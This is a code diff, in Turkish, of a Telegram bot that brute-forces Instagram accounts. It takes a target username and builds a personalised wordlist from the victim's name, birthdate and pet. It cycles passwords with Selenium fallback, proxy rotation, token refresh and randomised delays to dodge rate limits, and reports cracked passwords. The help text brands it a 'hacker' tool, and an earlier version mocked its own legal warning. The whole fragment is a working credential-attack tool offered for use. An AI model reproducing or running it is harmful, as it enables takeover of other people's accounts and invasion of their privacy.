+                        except TelegramError as e:
+                            logger.error(f"Progress callback error: {e}")
+                elif response.status_code == 429:
+                    potential_passwords.add(password)
+                    try:
+                        await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
+                        await asyncio.sleep(30)
+                        result = self._selenium_login_attempt(username, password)
+                    except TelegramError as e:
+                        logger.error(f"Progress callback error: {e}")
+                else:
+                    potential_passwords.add(password)
+                    try:
+                        await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
+                        result = self._selenium_login_attempt(username, password)
+                    except TelegramError as e:
+                        logger.error(f"Progress callback error: {e}")
+            else:
+                potential_passwords.add(password)
+                try:
+                    await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
+                    result = self._selenium_login_attempt(username, password)
+                except TelegramError as e:
+                    logger.error(f"Progress callback error: {e}")
+
+            if result == "SUCCESS":
+                try:
+                    await progress_callback(f"🎉 BAŞARILI! (Selenium) Şifre bulundu: {password}")
+                except TelegramError as e:
+                    logger.error(f"Progress callback error: {e}")
+                return password
+            elif result == "2FA":
+                try:
+                    await progress_callback(f"🔐 2FA gerekli! (Selenium) Şifre doğru: {password}")
+                except TelegramError as e:
+                    logger.error(f"Progress callback error: {e}")
+                return password
+            elif result == "CHECKPOINT":
+                try:
+                    await progress_callback(f"🚧 Checkpoint gerekli! (Selenium) Şifre doğru: {password}")
+                except TelegramError as e:
+                    logger.error(f"Progress callback error: {e}")
+                return password
+            elif result == "ERROR":
+                potential_passwords.add(password)
+                try:
+                    await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, tekrar deniyorum...")
+                except TelegramError as e:
+                    logger.error(f"Progress callback error: {e}")
+                failed_attempts += 1
+                if failed_attempts >= max_failed:
+                    if self.proxy_list:
+                        try:
+                            await progress_callback("🔄 Proxy değiştiriliyor...")
+                            self.current_proxy = self._get_working_proxy(progress_callback)
+                            if self.current_proxy:
+                                self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
+                                await progress_callback(f"✅ Yeni proxy ayarlandı: {self.current_proxy}")
+                                failed_attempts = 0
+                            else:
+                                await progress_callback("🔍 Çalışan proxy bulunamadı, proxysiz devam ediyorum...")
+                                await asyncio.sleep(60)
+                        except TelegramError as e:
+                            logger.error(f"Progress callback error: {e}")
+                    else:
+                        try:
+                            await progress_callback("🔍 60 saniye bekleniyor...")
+                            await asyncio.sleep(60)
+                            failed_attempts = 0
+                        except TelegramError as e:
+                            logger.error(f"Progress callback error: {e}")
+
+            tried_passwords += 1
+
+            if (i + 1) % 5 == 0:
+                try:
+                    await progress_callback("🔄 Token'lar yenileniyor...")
+                    success = await self._get_initial_cookies_and_tokens(progress_callback)
+                    if not success:
+                        await progress_callback("🔍 Token bulmaya çalışıyorum, sabret... (Selenium'a geçiliyor)")
+                        success = await self._selenium_get_tokens(progress_callback)
+                    if not success:
+                        await progress_callback("🔍 Token'lar alınamadı, devam ediyorum...")
+                except TelegramError as e:
+                    logger.error(f"Progress callback error: {e}")
+
+            delay = random.uniform(10, 20)
+            try:
+                await progress_callback(f"⏳ {delay:.1f}s bekleniyor...")
+                await asyncio.sleep(delay)
+            except TelegramError as e:
+                logger.error(f"Progress callback error: {e}")
+
+        # İşlem sonu rapor
+        report = f"📊 Rapor:\n- Denenen şifre sayısı: {tried_passwords}/{total_passwords}\n"
+        if potential_passwords:
+            report += f"- Kullanıcı adı doğru ama hata alınan şifreler (doğru olabilir, manuel olarak kontrol et): {', '.join(potential_passwords)}\n"
+        try:
             await progress_callback(report)
-            return None, report_file
-            
-        except Exception as e:
-            logger.error(f"Brute force hatası: {e}")
-            await progress_callback(f"❌ Beklenmeyen hata: {str(e)}")
-            report = f"📊 Rapor:\n- Denenen şifre sayısı: {tried_passwords}/{total_passwords}\n- Hata: {str(e)}"
-            report_file = f"report_{username}_{int(time.time())}.txt"
-            with open(report_file, 'w', encoding='utf-8') as f:
-                f.write(report)
-            return None, report_file
+            await progress_callback(f"⏰ Timeout ({timeout}s) aşıldı veya tüm şifreler denendi! Denenen şifre: {tried_passwords}/{total_passwords}")
+        except TelegramError as e:
+            logger.error(f"Progress callback error: {e}")
+        return None
 
 class TelegramBot:
     def __init__(self):
         self.user_data = {}
         self.brute_force_tasks = {}
-        self.brute_force_stop_events = {}
         self.password_generator = PasswordGenerator()
 
     def _initialize_user_data(self, user_id: int):
@@ -534,7 +676,6 @@ class TelegramBot:
                 'password_file': None,
                 'proxy_file': None,
                 'timeout': 1800,
-                'max_passwords': 10000,
                 'password_profile': {
                     'firstname': '', 'lastname': '', 'birthdate': '',
                     'pet': '', 'company': '', 'keywords': [],
@@ -546,26 +687,11 @@ class TelegramBot:
         user_id = update.effective_user.id
         self._initialize_user_data(user_id)
         try:
-            # Playwright'in yüklü olduğunu kontrol et
-            try:
-                check_playwright_installation()
-            except Exception as e:
-                await update.message.reply_text(f"❌ Playwright başlatma hatası: {str(e)}\nLütfen terminalde 'playwright install' komutunu çalıştırın.")
-                return
             await update.message.reply_text("🔒 Lütfen bot şifresini girin:")
             context.user_data['awaiting'] = 'password'
         except TelegramError as e:
             logger.error(f"Telegram send_message error: {e}")
-
-    async def stop_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Saldırıyı durdurma komutu"""
-        user_id = update.effective_user.id
-        
-        if user_id in self.brute_force_stop_events:
-            self.brute_force_stop_events[user_id].set()
-            await update.message.reply_text("🛑 Saldırı durduruluyor...")
-        else:
-            await update.message.reply_text("❌ Durdurulacak aktif saldırı bulunamadı.")
+            await update.message.reply_text("❌ Mesaj gönderilirken hata oluştu, lütfen tekrar dene!")
 
     async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
@@ -619,7 +745,7 @@ class TelegramBot:
                     logger.error(f"Telegram send_message error: {e}")
                 return
             username = update.message.text.strip()
-            if len(username) > 30:
+            if len(username) > 30:  # Instagram kullanıcı adı sınırı
                 try:
                     await update.message.reply_text("❌ Kullanıcı adı 30 karakterden uzun olamaz!")
                 except TelegramError as e:
@@ -635,6 +761,7 @@ class TelegramBot:
                 file = await update.message.document.get_file()
                 file_path = f"passwords_{user_id}.txt"
                 await file.download_to_drive(file_path)
+                # Dosyayı oku ve şifreleri kontrol et
                 try:
                     with open(file_path, 'r', encoding='utf-8') as f:
                         passwords = [line.strip() for line in f if line.strip() and len(line.strip()) <= 512]
@@ -697,34 +824,6 @@ class TelegramBot:
                 else:
                     try:
                         await update.message.reply_text("❌ Timeout 60-7200 saniye arasında olmalı!")
-                    except TelegramError as e:
-                        logger.error(f"Telegram send_message error: {e}")
-            except ValueError:
-                try:
-                    await update.message.reply_text("❌ Lütfen geçerli bir sayı gir!")
-                except TelegramError as e:
-                    logger.error(f"Telegram send_message error: {e}")
-                return
-        elif awaiting == 'max_passwords':
-            if not update.message.text or not update.message.text.strip():
-                try:
-                    await update.message.reply_text("❌ Boş şifre sayısı girilemez! Lütfen geçerli bir sayı gir (100-50000).")
-                except TelegramError as e:
-                    logger.error(f"Telegram send_message error: {e}")
-                return
-            try:
-                max_passwords = int(update.message.text)
-                if 100 <= max_passwords <= 50000:
-                    self.user_data[user_id]['max_passwords'] = max_passwords
-                    try:
-                        await update.message.reply_text(f"✅ Maksimum şifre sayısı ayarlandı: {max_passwords}")
-                        await update.message.reply_text("📝 Adı gir (boş bırakmak için butona bas):")
-                        context.user_data['awaiting'] = 'generate_firstname'
-                    except TelegramError as e:
-                        logger.error(f"Telegram send_message error: {e}")
-                else:
-                    try:
-                        await update.message.reply_text("❌ Şifre sayısı 100-50000 arasında olmalı!")
                     except TelegramError as e:
                         logger.error(f"Telegram send_message error: {e}")
             except ValueError:
@@ -887,8 +986,8 @@ class TelegramBot:
                 logger.error(f"Telegram send_message error: {e}")
         elif query.data == 'generate_password_list':
             try:
-                await query.message.reply_text("🔑 Şifre listesi oluşturmak için maksimum şifre sayısını gir (100-50000, varsayılan 10000):")
-                context.user_data['awaiting'] = 'max_passwords'
+                await query.message.reply_text("🔑 Şifre listesi oluşturmak için bilgileri gir. Adı gir (boş bırakmak için butona bas):")
+                context.user_data['awaiting'] = 'generate_firstname'
             except TelegramError as e:
                 logger.error(f"Telegram send_message error: {e}")
         elif query.data == 'leet_yes':
@@ -993,24 +1092,23 @@ class TelegramBot:
         elif query.data == 'how_to_use':
             how_to_use_message = (
                 "📖 *Botu Nasıl Kullanırım?*\n\n"
-                "👾 V.VV SUNAR HACKER V3.0 ile Instagram hesaplarını kırmak çok kolay! 🔥\n"
-                "⚠️ *Yasal Uyarı*: Bu botu sadece kendi hesabın veya izinli testler için kullan! hahah şska be ne yapıyorsan yap senin sorunun! 😎\n\n"
+                "👾 V.VV SUNAR HACKER V3.0 ile Instagram hesaplarını test etmek çok kolay! 🔥\n"
+                "⚠️ *Yasal Uyarı*: Bu botu sadece kendi hesabın veya izinli testler için kullan! Yasadışı kullanım seni başını belaya sokar, kankam! 😎\n\n"
                 "*Adım Adım Kullanım:*\n"
                 "1. *Kullanıcı Adı Gir* 🎯: Hedef Instagram kullanıcı adını yaz.\n"
                 "2. *Şifre Listesi Yükle veya Oluştur* 📜🔑:\n"
                 "   - *Yükle*: Hazır bir .txt dosyasında şifre listeni yükle (her satır bir şifre, max 512 karakter).\n"
-                "   - *Oluştur*: Ad, soyad, doğum tarihi, evcil hayvan adı, şirket adı veya anahtar kelimeler girerek kişiselleştirilmiş şifre listesi yap. Maksimum şifre sayısını belirtebilirsin (100-50000). Leet mode (ör: leet → 1337), özel karakterler (!@#) ve rastgele sayılar (01-99) ekleyebilirsin. Liste hazır olunca .txt olarak indirilecek!\n"
+                "   - *Oluştur*: Ad, soyad, doğum tarihi, evcil hayvan adı, şirket adı veya anahtar kelimeler girerek kişiselleştirilmiş şifre listesi yap. Leet mode (ör: leet → 1337), özel karakterler (!@#) ve rastgele sayılar (01-99) ekleyebilirsin. Liste hazır olunca .txt olarak indirilecek!\n"
                 "3. *Proxy Listesi Yükle* 🌐 (İsteğe bağlı): Daha güvenli test için proxy listesi (.txt) yükle.\n"
                 "4. *Timeout Ayarla* ⏰: İşlemin ne kadar süreceğini (60-7200 saniye) belirle.\n"
-                "5. *Saldırıyı Başlat* 🚀: Her şey hazır olunca brute-force'u başlat. Şüpheli şifreler otomatik tekrar denenir ve işlem bitince detaylı rapor .txt olarak indirilecek:\n"
+                "5. *Saldırıyı Başlat* 🚀: Her şey hazır olunca brute-force’u başlat. İşlem bitince rapor alacaksın:\n"
                 "   - Denenen şifre sayısı\n"
-                "   - Şüpheli şifrelerin tekrar denenme durumu\n"
-                "   - Her denemenin sonucu, kullanılan proxy ve süresi\n\n"
+                "   - Hata alınan şifreler (doğru olabilir, manuel kontrol et)\n\n"
                 "*💡 İpuçları*:\n"
                 "- Boş bırakmak için her adımda *Boş Bırak* butonunu kullan.\n"
                 "- Şifre listesi oluştururken çok fazla kelime ekleme, yoksa liste devasa olur! 😅\n"
                 "- Hata alırsan, /start ile yeniden başla.\n"
-                "- Loglar *instagram_response.json* dosyasında saklanır.\n\n"
+                "- Loglar ve hata alınan şifreler *instagram_response.json* dosyasında saklanır.\n\n"
                 "*🚀 Hadi Başla!* Menüden bir seçenek seç ve keyfine bak! 😜"
             )
             keyboard = [
@@ -1035,8 +1133,7 @@ class TelegramBot:
 
     async def generate_password_file(self, query: Update, user_id: int):
         profile = self.user_data[user_id]['password_profile']
-        max_passwords = self.user_data[user_id]['max_passwords']
-        wordlist = self.password_generator.generate_wordlist(profile, max_passwords)
+        wordlist = self.password_generator.generate_wordlist(profile)
         file_path = f"passwords_{user_id}.txt"
         with open(file_path, 'w', encoding='utf-8') as f:
             f.write('\n'.join(wordlist))
@@ -1067,7 +1164,7 @@ class TelegramBot:
         query = update.callback_query
 
         try:
-            await query.message.reply_text("🚀 Saldırı başlatılıyor...")
+            await query.message.reply_text("🚀 Saldırı başladığında bildirileceksin, şu an gerekli kurulumlar yapılıyor...")
         except TelegramError as e:
             logger.error(f"Telegram send_message error: {e}")
             return
@@ -1080,11 +1177,16 @@ class TelegramBot:
             return
 
         if not self.user_data[user_id]['username']:
-            await query.message.reply_text("❌ Lütfen önce kullanıcı adı gir!")
+            try:
+                await query.message.reply_text("❌ Lütfen önce kullanıcı adı gir!")
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
             return
-        
         if not self.user_data[user_id]['password_file'] or not os.path.exists(self.user_data[user_id]['password_file']):
-            await query.message.reply_text("❌ Lütfen geçerli bir şifre listesi yükle veya oluştur!")
+            try:
+                await query.message.reply_text("❌ Lütfen geçerli bir şifre listesi yükle veya oluştur!")
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
             return
 
         try:
@@ -1099,7 +1201,10 @@ class TelegramBot:
                     continue
 
             if not passwords:
-                await query.message.reply_text("❌ Şifre dosyası okunamadı veya boş!")
+                try:
+                    await query.message.reply_text("❌ Şifre dosyası okunamadı veya boş! Geçerli bir dosya yükle.")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
                 return
 
             proxy_list = []
@@ -1111,9 +1216,6 @@ class TelegramBot:
                         break
                     except UnicodeDecodeError:
                         continue
-
-            stop_event = asyncio.Event()
-            self.brute_force_stop_events[user_id] = stop_event
 
             core = InstagramBruteForce(proxy_list=proxy_list)
 
@@ -1128,54 +1230,48 @@ class TelegramBot:
                     self.user_data[user_id]['username'],
                     passwords,
                     self.user_data[user_id]['timeout'],
-                    progress_callback=progress_callback,
-                    stop_event=stop_event
+                    progress_callback=progress_callback
                 )
             )
-            
             self.brute_force_tasks[user_id] = task
-            result, report_file = await task
-
+            result = await task
             if result:
-                await query.message.reply_text(f"🎉 *BAŞARILI! Şifre bulundu: {result}*", parse_mode='Markdown')
+                try:
+                    await query.message.reply_text(f"🎉 *BAŞARILI! Şifre bulundu: {result}*", parse_mode='Markdown')
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
             else:
-                await query.message.reply_text("❌ İşlem tamamlandı, doğru şifre bulunamadı.")
-            
-            try:
-                await query.message.reply_document(document=InputFile(report_file, filename='bruteforce_report.txt'))
-            except TelegramError as e:
-                logger.error(f"Telegram send_document error: {e}")
-                await query.message.reply_text("❌ Rapor dosyası gönderilirken hata oluştu!")
-            
-            try:
-                os.remove(report_file)
-            except Exception as e:
-                logger.error(f"Rapor dosyası silme hatası: {report_file}, {str(e)}")
+                try:
+                    await query.message.reply_text(f"❌ İşlem tamamlandı, doğru şifre bulunamadı.", parse_mode='Markdown')
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
 
         except Exception as e:
-            await query.message.reply_text(f"❌ Başlatma hatası: {str(e)}")
+            try:
+                await query.message.reply_text(f"❌ Başlatma hatası: {str(e)}", parse_mode='Markdown')
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
         finally:
             if user_id in self.brute_force_tasks:
                 del self.brute_force_tasks[user_id]
-            if user_id in self.brute_force_stop_events:
-                del self.brute_force_stop_events[user_id]
-            
+            # Dosya temizliği
             for file_path in [self.user_data[user_id]['password_file'], self.user_data[user_id]['proxy_file']]:
                 if file_path and os.path.exists(file_path):
                     try:
                         os.remove(file_path)
+                        try:
+                            await query.message.reply_text(f"🗑️ Dosya silindi: {file_path}")
+                        except TelegramError as e:
+                            logger.error(f"Telegram send_message error: {e}")
                     except Exception as e:
                         logger.error(f"Dosya silme hatası: {file_path}, {str(e)}")
 
 async def main():
     bot = TelegramBot()
     application = Application.builder().token(TOKEN).build()
-    
     application.add_handler(CommandHandler("start", bot.start))
-    application.add_handler(CommandHandler("stop", bot.stop_attack))
     application.add_handler(CallbackQueryHandler(bot.button))
     application.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, bot.handle_message))
-    
     await application.run_polling()
 
 if __name__ == "__main__":
